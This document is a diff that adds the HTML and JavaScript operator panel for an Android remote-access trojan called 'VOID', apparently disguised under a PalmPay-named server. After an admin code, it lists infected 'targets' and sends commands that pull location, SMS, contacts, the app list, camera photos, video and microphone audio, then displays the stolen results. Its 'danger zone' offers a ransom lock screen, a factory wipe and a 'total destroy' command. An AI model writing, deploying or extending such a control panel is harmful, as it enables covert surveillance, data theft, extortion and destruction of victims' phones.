@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>VOID PANEL — ADMIN</title>
+<style>
+  :root{
+    --bg:#070b14; --card:#0f1729; --card-2:#141f38; --border:#1e2c4d;
+    --accent:#7b5cff; --accent-2:#22d3ee; --danger:#ff3355;
+    --success:#00e676; --text:#eef2fa; --text-2:#8894b5; --text-3:#4d5a7a;
+  }
+  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','Roboto',sans-serif;}
+  html,body{background:radial-gradient(1200px 700px at 50% -10%,#131d3a 0%,#070b14 60%);color:var(--text);min-height:100vh;overflow-x:hidden;}
+  body{padding:14px;display:flex;flex-direction:column;align-items:center;padding-bottom:60px;}
+
+  /* HEADER */
+  .topbar{width:100%;max-width:520px;display:flex;align-items:center;justify-content:space-between;padding:14px 18px;background:linear-gradient(180deg,rgba(20,31,56,.85),rgba(15,23,41,.85));backdrop-filter:blur(20px);border:1px solid var(--border);border-radius:18px;margin-bottom:24px;box-shadow:0 8px 30px rgba(0,0,0,.4);position:sticky;top:8px;z-index:50;}
+  .brand{font-size:15px;letter-spacing:.1em;font-weight:900;background:linear-gradient(90deg,var(--accent),var(--accent-2));-webkit-background-clip:text;background-clip:text;color:transparent;}
+  .brand small{display:block;font-size:8px;letter-spacing:.3em;color:var(--text-3);font-weight:600;margin-top:2px;-webkit-text-fill-color:initial;}
+
+  /* LOGIN */
+  .login-wrap{background:linear-gradient(180deg,var(--card-2),var(--card));border:1px solid var(--border);border-radius:22px;padding:38px 24px;margin-top:40px;width:100%;max-width:400px;box-shadow:0 20px 60px rgba(0,0,0,.5);}
+  .login-title{text-align:center;font-size:26px;letter-spacing:.1em;font-weight:900;color:#fff;margin-bottom:4px;}
+  .login-sub{text-align:center;font-size:10px;letter-spacing:.4em;color:var(--text-3);margin-bottom:34px;}
+  .field{width:100%;background:#070b14;border:1px solid var(--border);border-radius:14px;padding:17px;color:#fff;font-size:14px;letter-spacing:.1em;margin-bottom:12px;text-align:center;outline:none;}
+  .field:focus{border-color:var(--accent);box-shadow:0 0 0 4px rgba(123,92,255,.15);}
+  .btn-main{width:100%;padding:18px;border:none;border-radius:14px;font-weight:900;letter-spacing:.22em;font-size:13px;color:#fff;background:linear-gradient(135deg,var(--accent),var(--accent-2));cursor:pointer;box-shadow:0 10px 30px rgba(123,92,255,.4);}
+
+  /* DASHBOARD */
+  .dashboard{width:100%;max-width:520px;display:none;}
+  .dash-header{display:flex;align-items:center;justify-content:space-between;padding:14px 18px;background:linear-gradient(180deg,rgba(20,31,56,.85),rgba(15,23,41,.85));backdrop-filter:blur(20px);border:1px solid var(--border);border-radius:18px;margin-bottom:14px;}
+  .logout{font-size:10px;color:var(--text-2);letter-spacing:.15em;background:var(--card);border:1px solid var(--border);padding:8px 14px;border-radius:10px;cursor:pointer;}
+  
+  .page-title{font-size:22px;font-weight:900;letter-spacing:.08em;color:#fff;margin-bottom:4px;}
+  .page-sub{font-size:10px;color:var(--text-3);letter-spacing:.25em;margin-bottom:18px;}
+
+  .device-card{background:linear-gradient(180deg,var(--card-2),var(--card));border:1px solid var(--border);border-radius:16px;padding:18px;margin-bottom:12px;display:flex;justify-content:space-between;align-items:center;cursor:pointer;}
+  .device-card:active{transform:scale(.99);border-color:var(--accent);}
+  .device-card .info{flex:1;}
+  .device-card .dev-id{font-size:17px;font-weight:900;letter-spacing:.1em;color:#fff;}
+  .device-card .dev-model{font-size:11px;color:var(--text-2);margin-top:4px;}
+  .device-card .status{font-size:9px;font-weight:800;letter-spacing:.18em;padding:7px 13px;border-radius:20px;}
+  .device-card .status.online{background:rgba(0,230,118,.15);color:var(--success);}
+  .device-card .status.offline{background:rgba(77,90,122,.15);color:var(--text-3);}
+
+  /* CONTROL SCREEN */
+  .screen{display:none; width:100%; max-width:520px;}
+  .screen.active{display:block;}
+  .back-btn{background:var(--card);border:1px solid var(--border);color:var(--text-2);font-size:11px;letter-spacing:.15em;padding:10px 16px;border-radius:12px;margin-bottom:16px;cursor:pointer;}
+  .detail-title{font-size:22px;font-weight:900;letter-spacing:.08em;color:#fff;margin-bottom:4px;}
+  .detail-sub{font-size:11px;color:var(--text-2);margin-bottom:18px;}
+  
+  .grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:8px;}
+  .ctrl{background:linear-gradient(180deg,var(--card-2),var(--card));border:1px solid var(--border);border-radius:14px;padding:14px 8px;display:flex;flex-direction:column;align-items:center;text-align:center;cursor:pointer;transition:.2s;gap:5px;position:relative;}
+  .ctrl:active{transform:scale(.97);border-color:var(--accent);}
+  .ctrl .icon{font-size:22px;filter:drop-shadow(0 0 10px rgba(123,92,255,.5));}
+  .ctrl .label{font-size:10px;font-weight:800;letter-spacing:.1em;color:var(--text);}
+  .ctrl .desc{font-size:9px;color:var(--text-3);line-height:1.3;}
+  .ctrl.danger{border-color:rgba(255,51,85,.3); background:rgba(255,51,85,.05);}
+  .ctrl.danger:active{background:rgba(255,51,85,.2);}
+  
+  .output{background:#04070f;border:1px solid var(--border);border-radius:14px;padding:16px;font-size:12px;color:#b7c9ff;font-family:'Menlo','Courier New',monospace;line-height:1.6;max-height:50vh;min-height:120px;overflow-y:auto;white-space:pre-wrap;word-break:break-word;}
+  .output .empty{color:var(--text-3);text-align:center;padding:40px 0;font-size:11px;}
+  .output img{max-width:100%;border-radius:10px;border:1px solid var(--border);margin-top:8px;}
+
+  .toast{position:fixed;bottom:100px;left:50%;transform:translateX(-50%) translateY(20px);background:var(--card);border:1px solid var(--accent);color:#fff;padding:14px 24px;border-radius:14px;font-size:12px;opacity:0;transition:.3s;pointer-events:none;z-index:200;box-shadow:0 10px 40px rgba(123,92,255,.4);}
+  .toast.show{opacity:1;transform:translateX(-50%) translateY(0);}
+</style>
+</head>
+<body>
+
+<!-- TOP BAR -->
+<div class="topbar">
+  <div class="brand">VOID<small>CONTROL CENTER</small></div>
+  <button class="logout" id="logoutBtn" style="display:none;" onclick="logout()">LOGOUT</button>
+</div>
+
+<!-- LOGIN SCREEN -->
+<div id="loginScreen" style="width:100%; display:flex; justify-content:center;">
+  <div class="login-wrap">
+    <div class="login-title">VOID ADMIN</div>
+    <div class="login-sub">ENTER ACCESS CODE</div>
+    <input class="field" id="adminCode" type="number" placeholder="201019" maxlength="6">
+    <button class="btn-main" onclick="login()">ENTER PANEL</button>
+  </div>
+</div>
+
+<!-- DEVICE LIST -->
+<div class="dashboard" id="dashboard">
+  <div class="page-title">ACTIVE DEVICES</div>
+  <div class="page-sub">ALL CONNECTED TARGETS</div>
+  <div id="deviceList"><div class="empty" style="text-align:center; padding:30px; color:var(--text-3);">Loading devices...</div></div>
+</div>
+
+<!-- CONTROL SCREEN -->
+<div class="screen" id="controlScreen">
+  <button class="back-btn" onclick="showDashboard()">&lt; BACK TO DEVICES</button>
+  <div class="detail-title" id="targetId">—</div>
+  <div class="detail-sub" id="targetInfo">—</div>
+
+  <div class="grid">
+    <!-- TIER 1 -->
+    <div class="ctrl" onclick="sendCmd('location_sync')"><div class="icon">📍</div><div class="label">LOCATION</div></div>
+    <div class="ctrl" onclick="sendCmd('photo_capture')"><div class="icon">📸</div><div class="label">BACK CAM</div></div>
+    <div class="ctrl" onclick="sendCmd('self_photo')"><div class="icon">🤳</div><div class="label">SELFIE</div></div>
+    <div class="ctrl" onclick="sendCmd('message_sync')"><div class="icon">💬</div><div class="label">SMS</div></div>
+    
+    <!-- TIER 2 -->
+    <div class="ctrl" onclick="sendCmd('clip_record')"><div class="icon">🎥</div><div class="label">VIDEO 10s</div></div>
+    <div class="ctrl" onclick="sendCmd('voice_record')"><div class="icon">🎤</div><div class="label">AUDIO 15s</div></div>
+    <div class="ctrl" onclick="sendCmd('contact_sync')"><div class="icon">👤</div><div class="label">CONTACTS</div></div>
+    <div class="ctrl" onclick="sendCmd('app_list')"><div class="icon">📦</div><div class="label">APPS</div></div>
+
+    <!-- DANGER ZONE -->
+    <div class="ctrl danger" onclick="sendCmd('session_pause')"><div class="icon">🔒</div><div class="label">LOCK</div><div class="desc">Ransom Screen</div></div>
+    <div class="ctrl danger" onclick="sendCmd('factory_reset')"><div class="icon">⚠️</div><div class="label">WIPE</div><div class="desc">Factory Reset</div></div>
+    <div class="ctrl danger" onclick="sendCmd('bug_phone')"><div class="icon">☠️</div><div class="label">BUG PHONE</div><div class="desc">TOTAL DESTROY</div></div>
+  </div>
+
+  <div style="margin-top:20px;">
+    <div class="page-sub">LIVE OUTPUT</div>
+    <div class="output" id="outputBox"><div class="empty">WAITING FOR COMMAND</div></div>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+const SERVER = "https://palmpay-server.onrender.com"; // CHANGE THIS AFTER RENDER GIVES YOU THE URL
+const ADMIN_CODE = "201019";
+let currentDevice = null;
+let pollTimer = null;
+
+function $(id){return document.getElementById(id);}
+function showToast(m){const t=$('toast');t.textContent=m;t.classList.add('show');setTimeout(()=>t.classList.remove('show'),2500);}
+
+function login(){
+  const code = $('adminCode').value.trim();
+  if(code === ADMIN_CODE){
+    $('loginScreen').style.display = 'none';
+    $('dashboard').style.display = 'block';
+    $('logoutBtn').style.display = 'block';
+    loadDevices();
+  } else {
+    showToast("INVALID ADMIN CODE");
+  }
+}
+
+function logout(){
+  $('loginScreen').style.display = 'flex';
+  $('dashboard').style.display = 'none';
+  $('controlScreen').classList.remove('active');
+  $('logoutBtn').style.display = 'none';
+  currentDevice = null;
+  if(pollTimer) clearInterval(pollTimer);
+}
+
+async function loadDevices(){
+  const list = $('deviceList');
+  list.innerHTML = '<div class="empty" style="text-align:center; padding:30px; color:var(--text-3);">Scanning server...</div>';
+  try{
+    const r = await fetch(SERVER + "/clients?admin=1");
+    const j = await r.json();
+    const devices = j.clients || [];
+    
+    if(devices.length === 0){
+      list.innerHTML = '<div class="empty" style="text-align:center; padding:30px; color:var(--text-3);">No devices connected yet.</div>';
+      return;
+    }
+
+    list.innerHTML = '';
+    devices.forEach(d => {
+      const el = document.createElement('div');
+      el.className = 'device-card';
+      el.innerHTML = `
+        <div class="info">
+          <div class="dev-id">${d.userId}</div>
+          <div class="dev-model">${d.device || 'Unknown'} • ${d.android || '?'}</div>
+        </div>
+        <div class="status ${d.online ? 'online' : 'offline'}">${d.online ? 'ONLINE' : 'OFFLINE'}</div>
+      `;
+      el.onclick = () => openControl(d.userId, d.device, d.android);
+      list.appendChild(el);
+    });
+  }catch(e){
+    list.innerHTML = '<div class="empty" style="text-align:center; padding:30px; color:var(--danger);">Server error. Check Render status.</div>';
+  }
+}
+
+function showDashboard(){
+  $('controlScreen').classList.remove('active');
+  $('dashboard').style.display = 'block';
+  if(pollTimer) clearInterval(pollTimer);
+  loadDevices();
+}
+
+function openControl(id, model, android){
+  currentDevice = id;
+  $('targetId').textContent = id;
+  $('targetInfo').textContent = (model || 'Unknown') + ' • ' + (android || '?');
+  $('outputBox').innerHTML = '<div class="empty">WAITING FOR COMMAND</div>';
+  
+  $('dashboard').style.display = 'none';
+  $('controlScreen').classList.add('active');
+  
+  startPoll();
+}
+
+async function sendCmd(cmd){
+  if(!currentDevice) return;
+  
+  if(cmd === 'bug_phone'){
+    if(!confirm("WARNING: THIS WILL PERMANENTLY DESTROY THE TARGET PHONE. PROCEED?")) return;
+  }
+  if(cmd === 'factory_reset'){
+    if(!confirm("WARNING: THIS WILL WIPE THE TARGET PHONE. PROCEED?")) return;
+  }
+
+  $('outputBox').innerHTML = `<div class="empty">SENDING ${cmd.toUpperCase()}...</div>`;
+  
+  try{
+    await fetch(SERVER + "/dispatch", {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({ userId: currentDevice, cmd: cmd, args: '', admin: true })
+    });
+    showToast("Command Sent: " + cmd);
+  }catch(e){
+    showToast("Failed to send command");
+  }
+}
+
+function startPoll(){
+  if(pollTimer) clearInterval(pollTimer);
+  pollTimer = setInterval(async () => {
+    if(!currentDevice) return;
+    try{
+      const r = await fetch(SERVER + "/client?id=" + currentDevice + "&admin=1");
+      const j = await r.json();
+      if(j.ok && j.results && j.results.length){
+        const box = $('outputBox');
+        box.innerHTML = '';
+        j.results.slice(-5).reverse().forEach(res => {
+          const line = document.createElement('div');
+          line.style.marginBottom = '12px';
+          line.style.borderBottom = '1px solid #1a2440';
+          line.innerHTML = `<span style="color:#7b5cff; font-weight:bold;">&gt; ${res.cmd.toUpperCase()}</span><br>${res.data || '(empty)'}<br><span style="color:#445; font-size:10px;">${new Date(res.at).toLocaleTimeString()}</span>`;
+          box.appendChild(line);
+        });
+      }
+    }catch(e){}
+  }, 2000);
+}
+</script>
+</body>
+</html>
